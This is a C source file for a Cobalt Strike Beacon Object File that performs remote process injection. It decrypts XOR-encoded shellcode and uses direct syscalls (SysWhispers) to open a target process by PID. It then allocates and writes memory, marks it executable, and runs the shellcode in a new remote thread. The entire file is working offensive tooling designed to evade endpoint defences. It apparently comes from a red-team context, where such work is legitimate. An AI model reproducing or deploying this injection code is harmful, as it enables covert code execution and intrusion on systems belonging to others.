////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//      CREATEREMOTETHREAD BOF                                                                                        //
//                                                                                                                    //
//      POWERED BY: CobaltWhispers, SysWhispers2, InlineWhispers2                                                     //
//      AUTHOR: @Cerbersec                                                                                            //
//      PROPERTY OF: @NVISOsecurity                                                                                   //
//                                                                                                                    //
//      COMPILE WITH: gcc -o CreateRemoteThread.o -c CreateRemoteThread.c -masm=intel                                 //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include <TlHelp32.h>
#include "beacon.h"
#include "helpers.h"
#include "syscalls.c"

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                         MAIN                                                       //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void go(char* args, int alen)
{
    if(8 != sizeof(void*))
    {
        BeaconPrintf(CALLBACK_ERROR, "Not a 64 bit system");
        return;
    }

    /*==================================*/
    /*              PAYLOAD             */
    /*==================================*/

    SIZE_T allocation_size;
    int payload_size;
    datap parser;

    BeaconDataParse(&parser, args, alen);

    DWORD pid = BeaconDataInt(&parser);
    char* shellcode = BeaconDataExtract(&parser, &payload_size);

    if(payload_size == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Payload too small: %d", payload_size);
        return;
    }
    else
    {
        allocation_size = payload_size + 1;
    }

    shellcode = xordecrypt(shellcode, allocation_size);

    NTSTATUS status;
    HANDLE hProcess, hThread;

    /*==================================*/
    /*              GET PID             */
    /*==================================*/

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, 0, 0, 0, 0);
    CLIENT_ID cID;
    cID.UniqueThread = 0;
    cID.UniqueProcess = ULongToHandle(pid);

    NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);

    if(hProcess == INVALID_HANDLE_VALUE)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid handle: %ld", pid);
        goto lblCleanup;
    }

    /*==================================*/
    /*           MODIFY MEMORY          */
    /*==================================*/

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Allocating");
    LPVOID allocation_start = NULL;

    status = NtAllocateVirtualMemory(hProcess, &allocation_start, 0, &allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if(status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not allocate memory: %x", status);
        goto lblCleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Writing");
    status = NtWriteVirtualMemory(hProcess, allocation_start, shellcode, allocation_size, 0);

    if(status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not write memory: %x", status);
        //TODO: free memory?
        NtFreeVirtualMemory(hProcess, allocation_start, 0, MEM_RELEASE);
        goto lblCleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Changing protections");
    DWORD oldProtect;
    status = NtProtectVirtualMemory(hProcess, &allocation_start, &allocation_size, PAGE_EXECUTE_READ, &oldProtect);

    if(status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not change protections to EXECUTE_READ: %x", status);
        //TODO: free memory?
        NtFreeVirtualMemory(hProcess, allocation_start, 0, MEM_RELEASE);
        goto lblCleanup;
    }

    /*==================================*/
    /*       CREATE REMOTE THREAD       */
    /*==================================*/

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Creating remote thread");
    OBJECT_ATTRIBUTES oat = {sizeof(oat)};
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &oat, hProcess, (LPTHREAD_START_ROUTINE)allocation_start, allocation_start, 0, 0 , 0, 0, NULL);

    if(status != STATUS_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not create remote thread: %x", status);
        //TODO: free memory?
        NtFreeVirtualMemory(hProcess, allocation_start, 0, MEM_RELEASE);
        goto lblCleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");

lblCleanup:
    NtClose(hThread);
    NtClose(hProcess);
    hProcess = NULL;
    hThread = NULL;
    return;
}